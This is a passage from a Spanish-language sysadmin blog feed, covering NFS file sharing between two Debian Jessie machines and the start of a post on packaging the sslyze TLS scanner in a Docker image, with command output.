máquina.&lt;/p&gt;
&lt;p&gt;Para esta guía, vamos a utilizar dos máquinas &lt;em&gt;Debian Jessie&lt;/em&gt;, actuando como el servidor (el que tiene las carpetas compartidas) y como el cliente (el ordenador de un usuario concreto).&lt;/p&gt;
&lt;p&gt;Un &lt;em&gt;setup&lt;/em&gt; mas realista sería poner el servidor en un servidor casero (tipo &lt;em&gt;Raspberry Pi&lt;/em&gt;), mientras que los ordenadores cliente serían los de los diferentes usuarios de casa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: El servidor NFS de &lt;em&gt;linux&lt;/em&gt; va por &lt;em&gt;kernel&lt;/em&gt;, así que nos os va a funcionar desde un contenedor, por ejemplo &lt;em&gt;LXC&lt;/em&gt; o &lt;em&gt;Docker&lt;/em&gt;. En este caso, las máquinas disponen de &lt;em&gt;kernel&lt;/em&gt; completo, porque se han utilizado &lt;em&gt;VirtualBox&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, disponemos de 2 máquinas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;server&lt;/strong&gt; &amp;rarr; 10.0.0.2&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;client&lt;/strong&gt; &amp;rarr; 10.0.0.3&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Preparando el servidor&lt;/h2&gt;
&lt;p&gt;Para preparar el servidor, necesitamos instalar el paquete que provee el servidor de &lt;strong&gt;NFS&lt;/strong&gt;, que en este caso es &lt;strong&gt;nfs-kernel-server&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install -y nfs-kernel-server
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  file libevent-2.0-5 libldap-2.4-2 libmagic1 libnfsidmap2 libpython-stdlib libpython2.7-minimal libpython2.7-stdlib libsasl2-2
  libsasl2-modules libsasl2-modules-db libsqlite3-0 libtirpc1 mime-support nfs-common python python-minimal python2.7
  python2.7-minimal rpcbind
Paquetes sugeridos:
  libsasl2-modules-otp libsasl2-modules-ldap libsasl2-modules-sql libsasl2-modules-gssapi-mit libsasl2-modules-gssapi-heimdal
  open-iscsi watchdog python-doc python-tk python2.7-doc binutils binfmt-support
Se instalarán los siguientes paquetes NUEVOS:
  file libevent-2.0-5 libldap-2.4-2 libmagic1 libnfsidmap2 libpython-stdlib libpython2.7-minimal libpython2.7-stdlib libsasl2-2
  libsasl2-modules libsasl2-modules-db libsqlite3-0 libtirpc1 mime-support nfs-common nfs-kernel-server python python-minimal
  python2.7 python2.7-minimal rpcbind
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;21&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;6&lt;/span&gt;.072 kB de archivos.
Se utilizarán &lt;span class="m"&gt;23&lt;/span&gt;,7 MB de espacio de disco adicional después de esta operación.
...
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Supongamos que queremos compartir la carpeta &lt;em&gt;/shared/&lt;/em&gt;, lo que significa que tenemos que crearla si no existiera, y hay que darle los permisos adecuados al uso que se le vaya a dar. A modo de ejemplo, vamos a dar todos los permisos posibles a todo el mundo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /shared
root@server:~# chmod &lt;span class="m"&gt;777&lt;/span&gt; /shared/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a declarar este punto &lt;em&gt;exportable&lt;/em&gt;, con permisos de escritura para las máquinas que lo necesiten.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/exports
/shared &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3&lt;span class="o"&gt;(&lt;/span&gt;rw,sync&lt;span class="o"&gt;)&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente hacemos un &lt;em&gt;restart&lt;/em&gt; o un &lt;em&gt;reload&lt;/em&gt; del servicio de &lt;strong&gt;NFS&lt;/strong&gt; para que recargue la configuración.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Este servicio no arranca en contenedores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl restart nfs-kernel-server
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto ya tenemos nuestra carpeta &lt;em&gt;exportable&lt;/em&gt; disponible para los clientes definidos en &lt;em&gt;/etc/exports&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Preparando una de las máquinas cliente&lt;/h2&gt;
&lt;p&gt;El primer paso consiste en instalar el paquete &lt;strong&gt;nfs-common&lt;/strong&gt;, que nos va a proveer de las utilidades necesarias para montar el sistema de ficheros remoto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# apt-get install -y nfs-common
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  file libevent-2.0-5 libldap-2.4-2 libmagic1 libnfsidmap2 libpython-stdlib libpython2.7-minimal libpython2.7-stdlib libsasl2-2
  libsasl2-modules libsasl2-modules-db libsqlite3-0 libtirpc1 mime-support python python-minimal python2.7 python2.7-minimal
  rpcbind
Paquetes sugeridos:
  libsasl2-modules-otp libsasl2-modules-ldap libsasl2-modules-sql libsasl2-modules-gssapi-mit libsasl2-modules-gssapi-heimdal
  open-iscsi watchdog python-doc python-tk python2.7-doc binutils binfmt-support
Se instalarán los siguientes paquetes NUEVOS:
  file libevent-2.0-5 libldap-2.4-2 libmagic1 libnfsidmap2 libpython-stdlib libpython2.7-minimal libpython2.7-stdlib libsasl2-2
  libsasl2-modules libsasl2-modules-db libsqlite3-0 libtirpc1 mime-support nfs-common python python-minimal python2.7
  python2.7-minimal rpcbind
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;20&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;5&lt;/span&gt;.954 kB de archivos.
Se utilizarán &lt;span class="m"&gt;23&lt;/span&gt;,3 MB de espacio de disco adicional después de esta operación.
...
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos un punto de montaje para la carpeta remota, en caso de necesitarla.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# mkdir /compartida
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y montamos la carpeta remota, usando las herramientas estándar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# mount -t nfs &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:/shared /compartida
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si nos gustara el resultado, podemos hacer el montaje automático añadiendo una línea en &lt;em&gt;/etc/fstab&lt;/em&gt;, que podéis copiar tal cual de &lt;em&gt;/etc/mtab&lt;/em&gt; cuando la carpeta remota esté montada.&lt;/p&gt;
&lt;h2&gt;Algunas pruebas de funcionamiento&lt;/h2&gt;
&lt;p&gt;Partimos de una carpeta compartida vacía, y vemos que también está vacía en el cliente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls /shared/
root@server:~#

root@client:~# ls /compartida/
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos crear un fichero cualquiera en la máquina cliente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@client:~# touch /compartida/client_data
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que no hay ningún problema por trabajar en la carpeta desde otra máquina, por ejemplo, creando un fichero en la máquina servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# touch /shared/server_data
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente vemos que la carpeta, sea la carpeta local del servidor o la carpeta montada remotamente del cliente, reflejan ambos cambios aplicados anteriormente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls /shared/
client_data  server_data
root@server:~#

root@client:~# ls /compartida/
client_data  server_data
root@client:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto vemos que funciona como debe.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="NFS"></category></entry><entry><title>Un escáner SSL con sslyze</title><link href="http://www.linuxsysadmin.ml/2017/01/un-escaner-ssl-con-sslyze.html" rel="alternate"></link><published>2017-01-30T10:00:00+01:00</published><updated>2017-01-30T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-01-30:/2017/01/un-escaner-ssl-con-sslyze.html</id><summary type="html">&lt;p&gt;El otro día cayó en mis manos un escaneo de la plataforma para uno de los servicios que gestiono. No voy a dar detalles al respecto en virtud del acuerdo de confidencialidad que mantengo con ellos, pero consideré interesante una de las herramientas que usaron para testear el dominio SSL …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día cayó en mis manos un escaneo de la plataforma para uno de los servicios que gestiono. No voy a dar detalles al respecto en virtud del acuerdo de confidencialidad que mantengo con ellos, pero consideré interesante una de las herramientas que usaron para testear el dominio SSL.&lt;/p&gt;
&lt;p&gt;Se trata de una herramienta llamada &lt;strong&gt;sslyze&lt;/strong&gt; y hecha en &lt;strong&gt;python&lt;/strong&gt;, que podemos encontrar en &lt;a href="https://pypi.python.org/pypi/SSLyze"&gt;PyPI&lt;/a&gt; y que podemos instalar con un simple &lt;code&gt;pip install sslyze&lt;/code&gt;. La parte mala es que tiene extensiones escritas en lenguaje C, que necesitan compilarse y requieren de otras librerías, además del compilador.&lt;/p&gt;
&lt;p&gt;Como me gusta mantener mi entorno minimalista, decidí crear una imagen con &lt;strong&gt;Docker&lt;/strong&gt;, para disponer de ella cuando la necesite y poder deshacerme de ella cuando no. Este es el &lt;em&gt;Dockerfile&lt;/em&gt; que he usado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@marcopolo:~$ cat sslyze/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache py-pip gcc python-dev musl-dev &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    pip install sslyze &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apk del gcc python-dev musl-dev
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/sslyze&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;--regular&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;-h&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@marcopolo:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta manera puedo lanzar la imagen sin especificar los parámetros; por defecto va a ejecutar &lt;code&gt;sslyze --regular -h&lt;/code&gt; para darnos una idea de lo que debemos hacer. En caso de especificar uno o más dominios después de la imagen durante el &lt;code&gt;docker run&lt;/code&gt;, se lanza su escaneo directamente.&lt;/p&gt;
&lt;p&gt;Construimos la imagen de la forma habitual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@marcopolo:~$ docker build -t sslyze sslyze/
Sending build context to Docker daemon &lt;span class="m"&gt;2&lt;/span&gt;.048 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM alpine:3.4
 ---&amp;gt; baa5d63471ea
Step &lt;span class="m"&gt;2&lt;/span&gt; : RUN apk add --no-cache py-pip gcc python-dev musl-dev &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     pip install sslyze &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apk del gcc python-dev musl-dev
 ---&amp;gt; Running in 21a5ddf65843
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.4/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Upgrading musl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r12 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;.1.14-r14&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing binutils-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing binutils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing gmp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.1.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing isl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.14.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing libgomp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing libatomic &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing libgcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing pkgconf &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.9.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing pkgconfig &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.25-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing mpfr3 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing mpc1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing libstdc++ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing gcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Upgrading musl-utils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r12 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;.1.14-r14&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;16&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing musl-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r14&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing libbz2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.6-r5&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;18&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.1.1-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;19&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing libffi &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.2.1-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing gdbm &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.11-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;21&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo-base &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;22&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-terminfo &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;23&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing ncurses-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.0-r7&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;24&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing readline &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.3.008-r4&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;26&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;27&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing py-setuptools &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20&lt;/span&gt;.8.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;28&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing py-pip &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;/29&lt;span class="o"&gt;)&lt;/span&gt; Installing python-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r11.trigger
OK: &lt;span class="m"&gt;150&lt;/span&gt; MiB in &lt;span class="m"&gt;38&lt;/span&gt; packages
Collecting sslyze
  Downloading SSLyze-0.14.1.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1MB&lt;span class="o"&gt;)&lt;/span&gt;
Collecting nassl&amp;lt;&lt;span class="m"&gt;0&lt;/span&gt;.15.0,&amp;gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.14.0 &lt;span class="o"&gt;(&lt;/span&gt;from sslyze&lt;span class="o"&gt;)&lt;/span&gt;
  Downloading nassl-0.14.1.tar.gz &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;.2MB&lt;span class="o"&gt;)&lt;/span&gt;
Installing collected packages: nassl, sslyze
  Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; nassl: started
    Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; nassl: finished with status &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;
  Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; sslyze: started
    Running setup.py install &lt;span class="k"&gt;for&lt;/span&gt; sslyze: finished with status &lt;span class="s1"&gt;&amp;#39;done&amp;#39;&lt;/span&gt;
Successfully installed nassl-0.14.1 sslyze-0.14.1
You are using pip version &lt;span class="m"&gt;8&lt;/span&gt;.1.2, however version &lt;span class="m"&gt;9&lt;/span&gt;.0.1 is available.
You should consider upgrading via the &lt;span class="s1"&gt;&amp;#39;pip install --upgrade pip&amp;#39;&lt;/span&gt; command.
WARNING: Ignoring APKINDEX.167438ca.tar.gz: No such file or directory
WARNING: Ignoring APKINDEX.a2e6dac0.tar.gz: No such file or directory
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging gcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging binutils &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging isl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.14.1-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging libatomic &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging musl-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.1.14-r14&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging python-dev &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging pkgconfig &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.25-r1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging pkgconf &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.9.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;9&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging binutils-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.26-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging mpc1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging mpfr3 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.1.2-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging gmp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;.1.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging libgomp &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging libstdc++ &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;15&lt;/span&gt;/15&lt;span class="o"&gt;)&lt;/span&gt; Purging libgcc &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;.3.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r11.trigger
OK: &lt;span class="m"&gt;61&lt;/span&gt; MiB in &lt;span class="m"&gt;23&lt;/span&gt; packages
 ---&amp;gt; 27687d30520b
Removing intermediate container 21a5ddf65843
Step &lt;span class="m"&gt;3&lt;/span&gt; : ENTRYPOINT /usr/bin/sslyze --regular
 ---&amp;gt; Running in 6ee35651756c
 ---&amp;gt; 0199b0fde79a
